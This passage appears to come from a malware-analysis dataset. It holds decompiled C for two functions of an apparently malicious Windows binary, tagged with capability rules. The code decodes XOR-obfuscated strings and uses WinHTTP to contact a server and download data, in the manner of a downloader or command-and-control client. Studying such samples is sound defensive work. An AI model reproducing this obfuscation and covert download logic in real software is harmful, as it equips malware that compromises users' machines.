        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00404e2b(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h, uint arg_24h, int32_t arg_28h, uint *arg_2ch)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    char cVar7;\n    char cVar8;\n    uint32_t uVar9;\n    ushort *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint uVar13;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uchar *puVar14;\n    int32_t iVar15;\n    uchar *puStack1300;\n    int32_t iStack1296;\n    uint uStack1292;\n    uint uStack1288;\n    uint uStack1284;\n    int32_t iStack1280;\n    int32_t iStack1276;\n    uchar *puStack1272;\n    uint uStack1268;\n    int32_t iStack1264;\n    int32_t iStack1260;\n    uchar *puStack1256;\n    uint uStack1252;\n    ushort *puStack1180;\n    uchar *puStack1176;\n    uint uStack1172;\n    int32_t iStack1168;\n    uint uStack1164;\n    uint uStack1160;\n    uint uStack1156;\n    uint uStack1152;\n    uint8_t auStack1148 [2];\n    ushort uStack1146;\n    ushort uStack1144;\n    ushort uStack1142;\n    ushort uStack1140;\n    uchar uStack1138;\n    uchar uStack1137;\n    ushort uStack1124;\n    ushort uStack1122;\n    ushort uStack1120;\n    uchar uStack1118;\n    uchar uStack1117;\n    uint uStack1116;\n    uint uStack1112;\n    int32_t iStack1108;\n    uchar auStack1100 [4];\n    uint uStack1096;\n    uint uStack1092;\n    uint uStack1088;\n    uint uStack1084;\n    uchar uStack1080;\n    uchar uStack1079;\n    ushort uStack1078;\n    uint uStack1076;\n    uint uStack1072;\n    int32_t iStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint uStack1052;\n    uint uStack1048;\n    uchar auStack1044 [12];\n    uint uStack1032;\n    ushort *puStack1028;\n    uint uStack1024;\n    int32_t iStack1020;\n    uint uStack1016;\n    uint uStack1012;\n    uint uStack1008;\n    uint uStack1004;\n    uint uStack1000;\n    uint uStack996;\n    uint uStack992;\n    uint uStack988;\n    uint uStack984;\n    uint uStack980;\n    uint uStack976;\n    uint uStack972;\n    uint uStack968;\n    uint uStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    uint uStack944;\n    uint uStack940;\n    uint uStack936;\n    uint uStack932;\n    uint uStack928;\n    uint uStack924;\n    uint uStack920;\n    uint uStack916;\n    uint uStack912;\n    uint uStack908;\n    uint uStack904;\n    uchar uStack900;\n    uint uStack899;\n    uint uStack895;\n    uint uStack891;\n    uint uStack887;\n    uint uStack883;\n    uint uStack879;\n    uchar uStack875;\n    uchar uStack874;\n    uint uStack873;\n    uint32_t uStack869;\n    uchar uStack865;\n    uint uStack864;\n    ushort *puStack860;\n    int32_t iStack856;\n    int32_t iStack848;\n    ushort *puStack844;\n    int32_t iStack836;\n    uint uStack832;\n    uchar auStack784 [256];\n    uchar auStack528 [524];\n    \n    uStack1140 = unaff_ESI;\n    uStack1138 = unaff_ESI >> 0x10;\n    uStack1137 = unaff_ESI >> 0x18;\n    uStack1144 = unaff_EDI;\n    uStack1142 = unaff_EDI >> 0x10;\n    if (arg_2ch != NULL) {\n        *arg_2ch = 0;\n    }\n    puVar14 = &stack0xfffffcf0;\n    for (iVar11 = 0x100; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    puVar14 = &stack0xfffffdf0;\n    for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    auStack1148[0] = arg_8h;\n    auStack1148[1] = arg_8h >> 8;\n    uStack1146 = arg_8h >> 0x10;\n    uStack1152 = 0x404e6d;\n    iVar11 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    if (iVar11 == 0) {\n        return 3;\n    }\n    if (*0x427960 == 0) {\n        uStack900 = 6;\n        uStack1152 = 0x6;\n        iStack1020 = 0x7424547b;\n        uStack1016 = 0x545f4442;\n        uStack1012 = 0x44547427;\n        uStack1008 = 0x74645457;\n        uStack1004 = 0x5418440d;\n        uStack1000 = 0x4418747b;\n        uStack996 = 0x741c541e;\n        uStack992 = 0x54584451;\n        uStack988 = 0x4457742f;\n        uStack984 = 0x74385441;\n        uStack980 = 0x54784418;\n        uStack976 = 0x4418741f;\n        uStack972 = 0x74655400;\n        uStack968 = 0x540d4409;\n        uStack964 = 0x446f746b;\n        uStack960 = 0x7425545f;\n        uStack956 = 0x5402440e;\n        uStack952 = 0x44187470;\n        uStack948 = 0x747d544e;\n        uStack944 = 0x540d440c;\n        uStack940 = 0x444a746b;\n        uStack936 = 0x74715440;\n        uStack932 = 0x5403440a;\n        uStack928 = 0x44087465;\n        uStack924 = 0x746b541f;\n        uStack920 = 0x5453447f;\n        uStack916 = 0x44537428;\n        uStack912 = 0x74645459;\n        uStack908 = 0x5407440a;\n        uStack904 = 0x4408747b;\n        uStack899 = 0x8747a54;\n        uStack895 = 0x6b540744;\n        uStack891 = 0x5f447e74;\n        uStack887 = 0x5d743954;\n        uStack883 = 0x24545044;\n        uStack879 = 0x19444074;\n        uStack875 = 0x54;\n        uStack874 = 0x79;\n        uStack873 = 0x18440d74;\n        uStack869 = 0x38747b54;\n        uStack865 = 0x44;\n        uStack1120 = 0x5436;\n        uStack1118 = 0x4b;\n        uStack1117 = 0x74;\n        uStack1116 = CONCAT22(uStack1116._2_2_, 0x4438);\n        uStack1156 = 0x405064;\n        fcn.004065f9();\n        uStack1116 = &stack0xfffffc00 + -puStack1028;\n        iVar11 = 0;\n        do {\n            pcVar1 = puStack1028 + iVar11;\n            uStack1156 = 0x405080;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uStack1156 = 0x6;\n            uVar2 = (&stack0xfffffb9c)[iVar11 % 6];\n            uVar3 = pcVar1[uStack1116];\n            uStack1156 = 0x40509d;\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar11 = iVar11 + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (iVar11 < 0x9c);\n        uStack1156 = NULL;\n        uStack1160 = NULL;\n        uStack1164 = 0;\n        iStack1168 = 0;\n        uStack1172 = puStack1028;\n        puStack1176 = 0x4050bb;\n        *0x427960 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)();\n        if (*0x427960 == 0) {\n            uStack1152 = 0x4050df;\n            fcn.004065d4();\n            return 1;\n        }\n        uStack1152 = 0x4050d0;\n        fcn.004065d4();\n    }\n    puVar10 = NULL;\n    if (arg_8h != 0) {\n        uStack1156 = 0x4050ee;\n        uStack1152 = arg_8h;\n        iVar11 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        uStack1156 = (iVar11 + 1) * 2;\n        uStack1160 = 0x8;\n        uStack1164 = 0x4050fd;\n        uStack1164 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iStack1168 = 0x405104;\n        puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        puStack1176 = 0xffffffff;\n        auStack1148[0] = puVar10;\n        auStack1148[1] = puVar10 >> 8;\n        uStack1146 = puVar10 >> 0x10;\n        *puVar10 = 0;\n        puStack1180 = arg_8h;\n        uStack1172 = puVar10;\n        iStack1168 = iVar11 + 1;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    }\n    uStack1152 = NULL;\n    uStack1156 = arg_24h;\n    uStack1164 = *0x427960;\n    iStack1168 = 0x40512e;\n    uStack1160 = puVar10;\n    uStack864 = (*_sym.imp.WINHTTP.dll_WinHttpConnect)();\n    iStack1168 = 0x3d;\n    uStack1172 = 0x8;\n    uStack1076 = 0x6730493f;\n    uStack1072 = 0x49277a3a;\n    iStack1068 = 0x7a746737;\n    uStack1064 = 0x676b4978;\n    uStack1060 = 0x49247a6b;\n    uStack1056 = 0x7a6b677e;\n    uStack1052 = 0x676b4933;\n    uStack1048 = CONCAT22(uStack1048._2_2_, 0x7a4e);\n    puStack1176 = 0x40518d;\n    puStack1176 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    puStack1180 = 0x405194;\n    uVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)();\n    uVar12 = 0;\n    uStack873 = uStack873 & 0xff | uVar9 << 8;\n    uStack869 = uStack869 & 0xffffff00 | uVar9 >> 0x18;\n    do {\n        *(uVar9 + uVar12) = *(uVar9 + uVar12) * 'y';\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x3d);\n    puStack1180 = 0x3d;\n    sub.ntdll.dll_memset();\n    iVar11 = 0;\n    puVar14 = &stack0xfffffbc0 + -uVar9;\n    uStack1140 = SUB42(puVar14, 0);\n    uStack1138 = puVar14 >> 0x10;\n    uStack1137 = puVar14 >> 0x18;\n    do {\n        pcVar1 = uVar9 + iVar11;\n        puStack1180 = 0x4051d2;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puStack1180 = 0x6;\n        uVar2 = (&stack0xfffffb84)[iVar11 % 6];\n        uVar3 = pcVar1[CONCAT13(uStack1137, CONCAT12(uStack1138, uStack1140))];\n        puStack1180 = 0x4051ef;\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar10 = uStack1160;\n        uVar9 = CONCAT13(uStack869, uStack873._1_3_);\n        iVar11 = iVar11 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (iVar11 < 0x1e);\n    puStack1180 = 0x50;\n    (*_sym.imp.USER32.dll_wsprintfW)();\n    puStack1180 = puVar10;\n    (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)();\n    iVar11 = CONCAT31(uStack887, uStack891._3_1_);\n    if (iVar11 == 0) {\n        uVar13 = 1;\n        goto code_r0x00405afa;\n    }\n    uStack1160 = 0x6a294201;\n    uStack1156 = 0x6c424664;\n    iStack1168 = 0x6a6c4246;\n    uStack1164 = CONCAT31(uStack1164._1_3_, 0x30);\n    fcn.0040666e();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    iVar11 = 0;\n    uStack1156 = &stack0xfffffb74 + -puStack860;\n    puStack1176 = NULL;\n    do {\n        pcVar1 = puStack860 + iVar11;\n        puStack1180 = 0x40528a;\n        cVar7 = (*pcVar4)();\n        puStack1180 = 0x5;\n        uVar2 = (&stack0xfffffb7c)[iVar11 % 5];\n        uVar3 = pcVar1[CONCAT13(uStack1137, CONCAT12(uStack1138, uStack1140))];\n        puStack1180 = 0x4052a3;\n        cVar8 = (*pcVar4)();\n        iVar11 = uStack1160 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        puStack860 = puStack844;\n        uStack1160 = iVar11;\n    } while (iVar11 < 8);\n    puStack1180 = puStack844;\n    uStack1088 = 0x78017846;\n    uStack1084 = 0x7317690b;\n    uStack1080 = 0x1c;\n    uStack1079 = 0x69;\n    uStack1078 = 0x7810;\n    uStack1076 = 0x695b7840;\n    uStack1072 = 0x69787348;\n    uStack1156 = 0x78737869;\n    uStack1152 = CONCAT31(uStack1152._1_3_, 0x69);\n    fcn.004066dd();\n    uStack1164 = 0;\n    uStack1144 = SUB42(&stack0xfffffbbc + -iStack856, 0);\n    uStack1142 = &stack0xfffffbbc + -iStack856 >> 0x10;\n    do {\n        iVar11 = uStack1164;\n        pcVar1 = iStack856 + uStack1164;\n        cVar7 = (*pcVar4)();\n        uVar2 = (&stack0xfffffb78)[iVar11 % 5];\n        uVar3 = pcVar1[CONCAT22(uStack1142, uStack1144)];\n        cVar8 = (*pcVar4)();\n        uStack1164 = uStack1164 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (uStack1164 < 0x14);\n    uStack1092 = 0x45226e7e;\n    uStack1088 = 0x5001510a;\n    uStack1084 = 0x6e286821;\n    uStack1080 = 99;\n    uStack1079 = 0x45;\n    uStack1078 = 0x515a;\n    uStack1076 = CONCAT22(uStack1076._2_2_, 0x506e);\n    uStack1160 = 0x45506e51;\n    uStack1156 = CONCAT31(uStack1156._1_3_, 0x68);\n    fcn.0040674c();\n    puVar14 = &stack0xfffffbb8 + -iStack836;\n    iStack1168 = 0;\n    auStack1148[0] = puVar14;\n    auStack1148[1] = puVar14 >> 8;\n    uStack1146 = puVar14 >> 0x10;\n    do {\n        iVar11 = iStack1168;\n        pcVar1 = iStack836 + iStack1168;\n        cVar7 = (*pcVar4)();\n        uVar2 = (&stack0xfffffb74)[iVar11 % 5];\n        uVar3 = pcVar1[CONCAT22(uStack1146, CONCAT11(auStack1148[1], auStack1148[0]))];\n        cVar8 = (*pcVar4)();\n        iStack1168 = iStack1168 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (iStack1168 < 0x12);\n    uStack1096 = 0x6b3b4877;\n    uStack1092 = 0x48377505;\n    uStack1088 = 0x751e6b2d;\n    uStack1084 = 0x6b7d486e;\n    uStack1080 = 0x67;\n    uStack1079 = 0x75;\n    uStack1156 = 0x6b494858;\n    uStack1152 = CONCAT22(uStack1152._2_2_, 0x7567);\n    fcn.004067b3();\n    uStack1152 = &stack0xfffffbb4 + -iStack848;\n    uStack1172 = NULL;\n    do {\n        iVar11 = uStack1172;\n        pcVar1 = iStack848 + uStack1172;\n        cVar7 = (*pcVar4)();\n        uVar2 = (&stack0xfffffb78)[iVar11 % 6];\n        uVar3 = pcVar1[uStack1152];\n        cVar8 = (*pcVar4)();\n        uStack1172 = uStack1172 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (uStack1172 < 0x12);\n    if (arg_14h == 0) {\n        if (((arg_10h == 0x140) || (arg_10h == 0x20)) || (arg_10h == 0x40)) goto code_r0x004054dd;\ncode_r0x00405ab9:\n        uVar13 = 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)();\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        *puVar10 = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\ncode_r0x004054dd:\n        puVar10 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)();\n        puStack1180 = puVar10;\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)();\n        if (puVar10 == NULL) goto code_r0x00405ab9;\n        iStack836 = 0x3300;\n        uStack832 = 8;\n        puVar14 = &stack0xfffffbb4;\n        for (iVar11 = 0x18; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        auStack1148[0] = 0x20;\n        puVar14 = &stack0xfffffbb4;\n        for (iVar11 = 0xc; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar14 = 0;\n            puVar14 = puVar14 + 1;\n        }\n        auStack1148[1] = 0x79;\n        uStack1146 = 0x3248;\n        uStack1144 = 0x7807;\n        uStack1142 = 0x650b;\n        uStack1140 = 0x575d;\n        uStack1138 = 0;\n        uStack1124 = 0x786d;\n        uStack1122 = 0x6559;\n        uStack1120 = 0x5774;\n        uStack1118 = 0x39;\n        uStack1116 = 0x78043229;\n        uStack1112 = 0x5732653c;\n        iStack1168 = 0x32657978;\n        uStack1164 = CONCAT31(uStack1164._1_3_, 0x57);\n        uStack1137 = auStack1148[1];\n        uStack1117 = auStack1148[1];\n        fcn.00406592();\n        iVar11 = 0;\n        puStack1176 = &stack0xfffffb80 + -iStack1068;\n        do {\n            pcVar1 = iStack1068 + iVar11;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = (&stack0xfffffb6c)[iVar11 % 5];\n            uVar3 = pcVar1[puStack1176];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar11 = iVar11 + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n        } while (iVar11 < 0x28);\n        uStack1152 = 0x5a784c39;\n        auStack1148[0] = 0x17;\n        auStack1148[1] = 0x6e;\n        uStack1146 = 0x4c13;\n        uStack1144 = 0x5a3a;\n        uStack1142 = 0x6e3f;\n        uStack1140 = 0x4c18;\n        uStack1138 = 0x78;\n        uStack1137 = 0x5a;\n        uStack1124 = 0x6e33;\n        uStack1122 = 0x4c5b;\n        uStack1120 = 0x5a75;\n        uStack1118 = 0x13;\n        uStack1117 = 0x6e;\n        uStack1116 = 0x5a004c33;\n        uStack1112 = 0x4c616e02;\n        uStack1164 = 0x5a554c61;\n        uStack1160 = CONCAT22(uStack1160._2_2_, 0x6e47);\n        fcn.0040649c();\n        iVar11 = CONCAT31(uStack879, uStack883._3_1_);\n        iVar15 = 0;\n        puStack1180 = &stack0xfffffb7c + -iVar11;\n        do {\n            pcVar1 = iVar11 + iVar15;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = (&stack0xfffffb70)[iVar15 % 6];\n            uVar3 = *(puStack1180 + pcVar1);\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar15 = iVar15 + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n            iVar11 = CONCAT31(uStack879, uStack883._3_1_);\n        } while (iVar15 < 0x2c);\n        uStack1156 = 0x597d6d1e;\n        uStack1152 = 0x501f4635;\n        auStack1148[0] = 0x36;\n        auStack1148[1] = 0x65;\n        uStack1146 = 0x6d3e;\n        uStack1144 = 0x5929;\n        uStack1142 = 0x4648;\n        uStack1140 = 0x503d;\n        uStack1138 = 0x2b;\n        uStack1137 = 0x65;\n        uStack1124 = 0x5970;\n        uStack1122 = 0x4623;\n        uStack1120 = 0x502c;\n        uStack1118 = 0x15;\n        uStack1117 = 0x65;\n        uStack1116 = 0x59156d15;\n        uStack1112 = CONCAT22(uStack1112._2_2_, 0x4665);\n        puStack1176 = 0x59506d46;\n        uStack1172 = CONCAT31(uStack1172._1_3_, 0x65);\n        fcn.00406517();\n        iVar15 = 0;\n        iVar11 = -iStack1108;\n        do {\n            pcVar1 = iStack1108 + iVar15;\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = (&stack0xfffffb64)[iVar15 % 5];\n            uVar3 = pcVar1[&stack0xfffffb78 + iVar11];\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar15 = iVar15 + 1;\n            *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n            pcVar4 = _sym.imp.KERNEL32.dll_lstrlenW;\n        } while (iVar15 < 0x2e);\n        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        iVar11 = iStack1168;\n        pcVar5 = _sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders;\n        (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)();\n        if (arg_28h == 0) {\n            (*pcVar4)();\n        }\n        else {\n            (*pcVar4)();\n        }\n        (*pcVar5)();\n        uStack1252 = 0x4057e7;\n        fcn.00403c68(0, 0);\n        pcVar4 = _sym.imp.WINHTTP.dll_WinHttpSetOption;\n        puStack1256 = &stack0xfffffc80;\n        uStack1252 = 4;\n        iStack1260 = 0x1f;\n        iStack1264 = iVar11;\n        uStack1268 = 0x4057fc;\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)();\n        uStack1268 = 4;\n        puStack1272 = &stack0xfffffc74;\n        iStack1276 = 0x3f;\n        iStack1280 = iVar11;\n        uStack1284 = 0x40580b;\n        (*pcVar4)();\n        if (arg_20h != 0) {\n            uStack1284 = 0x45;\n            uStack1288 = 8;\n            uStack1252 = 0x42727947;\n            uStack1292 = 0x405891;\n            uStack1292 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iStack1296 = 0x405898;\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            uVar9 = 0;\n            do {\n                *(iVar11 + uVar9) = *(iVar11 + uVar9) + '\\x16';\n                uVar9 = uVar9 + 1;\n            } while (uVar9 < 0x45);\n            iStack1296 = 0x45;\n            puStack1300 = NULL;\n            iStack1276 = iVar11;\n            sub.ntdll.dll_memset(iVar11);\n            iVar15 = 0;\n            puStack1272 = &stack0xfffffb1c + -iVar11;\n            do {\n                pcVar1 = iVar11 + iVar15;\n                iStack1296 = 0x4058cc;\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = (&stack0xfffffb10)[iVar15 % 5];\n                uVar3 = puStack1272[pcVar1];\n                iStack1296 = 0x4058e9;\n                cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar6 = iStack1276;\n                iVar15 = iVar15 + 1;\n                *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n                iVar11 = iStack1276;\n            } while (iVar15 < 0x22);\n            iStack1296 = arg_20h;\n            puStack1300 = iStack1276;\n            (*_sym.imp.USER32.dll_wsprintfW)(&stack0xfffffc5c);\n            puStack1300 = &stack0xfffffc5c;\n            iStack1296 = 0x10000000;\n            uVar13 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar11 = iStack1260;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(iStack1260, &stack0xfffffc58, uVar13);\n            uVar9 = 0;\n            do {\n                pcVar1 = iVar6 + uVar9;\n                *pcVar1 = *pcVar1 + -0x76;\n                uVar9 = uVar9 + 1;\n            } while (uVar9 < 0x45);\n            uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar13);\n        }\n        uStack1284 = 0;\n        uStack1288 = 0;\n        uStack1292 = 0;\n        iStack1296 = 0;\n        puStack1300 = 0xffffffff;\n        (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(iVar11, 0);\n        iVar15 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar11, 0);\n        pcVar4 = _sym.imp.WINHTTP.dll_WinHttpQueryHeaders;\n        if (iVar15 == 0) {\n            uVar13 = 1;\n        }\n        else {\n            uStack1024 = 0;\n            iStack1020 = 0;\n            uStack1008 = 4;\n            (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar11, 0x20000005, 0, &stack0xfffffc00, &stack0xfffffc10, 0);\n            if (*arg_18h == 0) {\n                *arg_18h = uStack1048;\n            }\n            uStack1032 = 4;\n            (*pcVar4)(iVar11, 0x20000013, 0, &stack0xfffffbec, &stack0xfffffbf8, 0);\n            if ((iStack1020 == 0xce) || (iStack1020 == 200)) {\n                if (arg_ch[1] == 0) {\n                    uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, uStack1024);\n                    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar13);\n                    *arg_ch = 0;\n                    arg_ch[1] = iVar15;\n                }\n                iStack1296 = arg_ch[1];\n                iStack1280 = 0;\n                do {\n                    puStack1300 = NULL;\n                    iVar15 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(iVar11, &stack0xfffffaec);\n                    if ((iVar15 == 0) ||\n                       (iVar15 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                           (iVar11, *arg_ch + iStack1296, puStack1300, &stack0xfffffb00),  iVar15 == 0))\n                    {\n                        uVar13 = 4;\n                        goto code_r0x00405a92;\n                    }\n                    *arg_ch = *arg_ch + iStack1280;\n                } while (puStack1300 != NULL);\n                *arg_1ch = *arg_ch;\n                if ((*arg_18h == 0) || (*arg_ch == *arg_18h)) {\n                    uVar13 = 0;\n                }\n                else {\n                    uVar13 = 6;\n                }\n            }\n            else {\n                uVar13 = 3;\n            }\n        }\ncode_r0x00405a92:\n        fcn.004064e6();\n        fcn.00406477();\n        fcn.00406561();\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar11);\n    }\n    fcn.0040678e();\n    fcn.00406727();\n    fcn.004066b8();\n    fcn.0040663d();\n    uVar9 = CONCAT31(uStack883, uStack887._3_1_);\n    iVar11 = CONCAT31(uStack887, uStack891._3_1_);\ncode_r0x00405afa:\n    uVar12 = 0;\n    do {\n        *(uVar9 + uVar12) = *(uVar9 + uVar12) * -0x7e;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x3d);\n    (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)();\n    if (iVar11 != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)();\n    }\n    return uVar13;\n}\n",
        "token_count": 8012
    },
    "00405b32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl\nfcn.00405b32(uint arg_8h, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch, \n            int32_t arg_20h, uint arg_24h, uint arg_28h, int32_t *arg_2ch)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    int32_t iVar7;\n    ushort *puVar8;\n    uint uVar9;\n    uint *puVar10;\n    uint extraout_ECX;\n    uchar *puVar11;\n    code *pcVar12;\n    uchar *puVar13;\n    int32_t iVar14;\n    uint uStack900;\n    int32_t iStack896;\n    uint uStack892;\n    uchar *puStack888;\n    uchar *puStack884;\n    uchar *in_stack_fffffc90;\n    uint uStack828;\n    uint uStack824;\n    uint uStack820;\n    int32_t iVar15;\n    int32_t iStack800;\n    uchar *puStack784;\n    int32_t iStack780;\n    uint uStack776;\n    uint uStack772;\n    uint uStack760;\n    int32_t iStack756;\n    uint uStack752;\n    uchar auStack748 [4];\n    uint uStack744;\n    uint uStack740;\n    uint uStack736;\n    uint uStack732;\n    uint uStack728;\n    uint uStack724;\n    uint uStack720;\n    uint uStack716;\n    uint uStack712;\n    uint uStack708;\n    uint uStack704;\n    uint uStack700;\n    int32_t iStack696;\n    int32_t iStack692;\n    uint uStack688;\n    int32_t iStack684;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    uint32_t uStack664;\n    uint uStack660;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uchar uStack624;\n    uint uStack623;\n    uint uStack619;\n    uint uStack615;\n    uint uStack611;\n    uint uStack607;\n    uint uStack603;\n    uint uStack599;\n    uint uStack595;\n    ushort uStack591;\n    uchar uStack589;\n    uchar auStack588 [4];\n    int32_t iStack584;\n    uint uStack576;\n    uint uStack572;\n    int32_t iStack564;\n    int32_t iStack552;\n    int32_t iStack532;\n    uint uStack524;\n    \n    uStack572 = 4;\n    uStack524 = 4;\n    uStack760 = 1;\n    if (arg_20h == 0) {\n        *arg_ch = 0;\n    }\n    uStack744 = 0x7424547b;\n    uStack740 = 0x545f4442;\n    uStack736 = 0x44547427;\n    uStack732 = 0x74645457;\n    uStack728 = 0x5418440d;\n    uStack724 = 0x4418747b;\n    uStack720 = 0x741c541e;\n    uStack716 = 0x54584451;\n    uStack712 = 0x4457742f;\n    uStack708 = 0x74385441;\n    uStack704 = 0x54784418;\n    uStack700 = 0x4418741f;\n    iStack696 = 0x74655400;\n    iStack692 = 0x540d4409;\n    uStack688 = 0x446f746b;\n    iStack684 = 0x7425545f;\n    uStack680 = 0x5402440e;\n    uStack676 = 0x44187470;\n    uStack672 = 0x747d544e;\n    uStack668 = 0x540d440c;\n    uStack664 = 0x444a746b;\n    uStack660 = 0x74715440;\n    uStack656 = 0x5403440a;\n    uStack652 = 0x44087465;\n    uStack648 = 0x746b541f;\n    uStack644 = 0x5453447f;\n    uStack640 = 0x44537428;\n    uStack636 = 0x74645459;\n    uStack632 = 0x5407440a;\n    uStack628 = 0x4408747b;\n    uStack624 = 6;\n    uStack623 = 0x8747a54;\n    uStack619 = 0x6b540744;\n    uStack615 = 0x5f447e74;\n    uStack611 = 0x5d743954;\n    uStack607 = 0x24545044;\n    uStack603 = 0x19444074;\n    uStack599 = 0xd747954;\n    uStack595 = 0x7b541844;\n    uStack591 = 0x3874;\n    uStack589 = 0x44;\n    iStack756 = 0x744b5436;\n    uStack752 = CONCAT22(uStack752._2_2_, 0x4438);\n    uStack824 = 0x405d19;\n    fcn.004065f9();\n    pcVar12 = _sym.imp.KERNEL32.dll_GetLastError;\n    uStack752 = &stack0xfffffd14 + -iStack532;\n    iStack800 = 0;\n    do {\n        pcVar1 = iStack532 + iStack800;\n        uStack824 = 0x405d3b;\n        cVar5 = (*pcVar12)();\n        uStack824 = 6;\n        uVar2 = (&stack0xfffffd08)[iStack800 % 6];\n        uVar3 = pcVar1[uStack752];\n        uStack824 = 0x405d54;\n        cVar6 = (*pcVar12)();\n        iStack800 = iStack800 + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (iStack800 < 0x9c);\n    uStack824 = 0x405d75;\n    iVar7 = fcn.0040db7c();\n    uStack824 = 0;\n    uStack828 = 0;\n    